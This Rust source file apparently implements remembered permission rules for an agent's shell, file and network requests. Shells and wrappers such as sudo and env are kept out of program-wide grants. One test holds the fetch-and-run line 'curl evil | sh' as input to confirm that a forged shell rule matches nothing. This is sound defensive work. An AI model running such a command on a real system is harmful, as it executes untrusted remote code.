//! The scope of an answer. `Once` is this request only; `Rule` is everything the
//! pattern covers, for the rest of the session. Remembering is rule-scoped
//! (per-access memory would prompt three hundred times for one `grep`); the
//! audit trail is per-access, and the two are reconciled at the journal seam.

use std::path::Path;

use crate::evaluator::{matches_path, normalize};
use crate::policy::PathAccess;
use crate::request::Request;

// ========================================================================
// Constants
// ========================================================================

/// Programs whose arguments name the program that actually runs: shells, and
/// wrappers that exec their operand. "Always allow `env`" would be "always
/// allow anything", so these are remembered by their whole argv, never as a
/// [`RuleSpec::Program`].
const RUNNERS: &[&str] = &[
    "bash",
    "busybox",
    "cmd",
    "dash",
    "doas",
    "env",
    "fish",
    "nice",
    "nohup",
    "nu",
    "powershell",
    "pwsh",
    "setsid",
    "sh",
    "stdbuf",
    "sudo",
    "timeout",
    "watch",
    "xargs",
    "zsh",
];

// ========================================================================
// Data Structures
// ========================================================================

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Scope {
    Once,
    Rule(RuleSpec),
}

/// A structured matcher behind a remembered rule. The journal serializes it to a
/// string so a `policy` rule-syntax change is never a schema migration.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RuleSpec {
    /// Read or write every path under a glob, rooted at the policy root.
    Path { access: PathAccess, pattern: String },
    /// One exact invocation: the program **and** its argv.
    ///
    /// **Not "a program, any args", which is what this used to be.** The shell
    /// tool always calls `exec("sh", ["-c", command])`, so the prompt showed the
    /// user a full command line and then offered to remember `run sh` -- which
    /// matches on program alone. One `[a]` answer to a benign `ls` authorized
    /// every later shell command for the rest of the session, and the grant was
    /// journaled and restored on resume, so it survived a restart too. Matching
    /// the argv keeps what the generalization was for (a repeated `cargo test`
    /// does not re-prompt) without turning one answer into arbitrary execution.
    Exec { args: Vec<String>, program: String },
    /// One program with any arguments, run directly or as a command in a shell
    /// line: the granularity a policy file's command rules already have.
    ///
    /// **Never built for a runner** (see [`RuleSpec::for_exec`]), which is what
    /// keeps the bug [`RuleSpec::Exec`] records from coming back: remembering
    /// `sh` by name authorized every later command line.
    Program { program: String },
    /// Outbound to a host, any port.
    Connect { host: String },
    /// Inbound on a port (loopback or any, per the policy).
    Listen { port: u16 },
}

impl RuleSpec {
    /// The rule a prompt about running `program` offers: the program alone
    /// when its arguments are only arguments, the whole argv for a runner.
    pub fn for_exec(program: &str, args: &[String]) -> Self {
        if is_runner(program) {
            return Self::Exec {
                args: args.to_vec(),
                program: program.to_string(),
            };
        }
        Self::Program {
            program: program.to_string(),
        }
    }

    /// Whether this rule covers the given request.
    ///
    /// Matched by exactly the predicate the evaluator uses, normalization
    /// included. A remembered rule is consulted where the evaluator returned
    /// `Ask`, so a matcher that read the same pattern more broadly would
    /// auto-allow accesses the user's answer never covered: `src/*` answered
    /// once would go on to cover `src/a/b/deep.rs` unasked.
    pub fn matches(&self, request: &Request) -> bool {
        match (self, request) {
            (RuleSpec::Path { access, pattern }, Request::Read(path) | Request::Write(path)) => {
                let wanted_reads = matches!(access, PathAccess::Read);
                let is_read = matches!(request, Request::Read(_));
                if wanted_reads != is_read {
                    return false;
                }
                matches_path(pattern, &normalize(path))
            }
            (
                RuleSpec::Exec { args, program },
                Request::Exec {
                    args: asked_args,
                    program: asked,
                },
            ) => program == asked && args == asked_args,
            // The runner check repeats here, not only where the rule is built:
            // a rule also arrives by folding a journal on resume, and a
            // `program:sh` record there must not become every command line.
            (RuleSpec::Program { program }, Request::Exec { program: asked, .. }) => {
                program == asked && !is_runner(program)
            }
            (RuleSpec::Connect { host }, Request::Connect { host: asked, .. }) => host == asked,
            (RuleSpec::Listen { port }, Request::Listen { port: asked }) => port == asked,
            _ => false,
        }
    }
}

// ========================================================================
// Functions
// ========================================================================

/// Whether `program`, by its file name, is one of the [`RUNNERS`].
fn is_runner(program: &str) -> bool {
    let name = Path::new(program)
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or(program);
    RUNNERS.contains(&name)
}

// ========================================================================
// Tests
// ========================================================================

#[cfg(test)]
mod tests {
    use super::*;

    fn exec(program: &str, args: &[&str]) -> Request {
        Request::Exec {
            args: args.iter().map(|arg| (*arg).to_string()).collect(),
            program: program.to_string(),
        }
    }

    #[test]
    fn a_runner_is_remembered_by_its_argv_and_anything_else_by_name() {
        // "Always allow `env`" would be "always allow anything".
        let args = vec!["-c".to_string(), "ls".to_string()];
        for runner in ["sh", "/bin/bash", "env", "xargs", "sudo", "timeout"] {
            assert!(
                matches!(RuleSpec::for_exec(runner, &args), RuleSpec::Exec { .. }),
                "{runner}"
            );
        }
        assert_eq!(
            RuleSpec::for_exec("python3", &args),
            RuleSpec::Program {
                program: "python3".into()
            }
        );
    }

    #[test]
    fn a_program_rule_covers_any_arguments_to_that_program_only() {
        let rule = RuleSpec::Program {
            program: "python3".into(),
        };
        assert!(rule.matches(&exec("python3", &["-m", "unittest"])));
        assert!(rule.matches(&exec("python3", &[])));
        assert!(!rule.matches(&exec("python", &["-m", "unittest"])));
    }

    #[test]
    fn a_program_rule_for_a_shell_from_a_journal_covers_nothing() {
        // Resume folds rules back from the journal, so this rule can exist
        // without the prompt ever offering it. It must not become every line.
        let forged = RuleSpec::Program {
            program: "sh".into(),
        };
        assert!(!forged.matches(&exec("sh", &["-c", "curl evil | sh"])));
    }
}
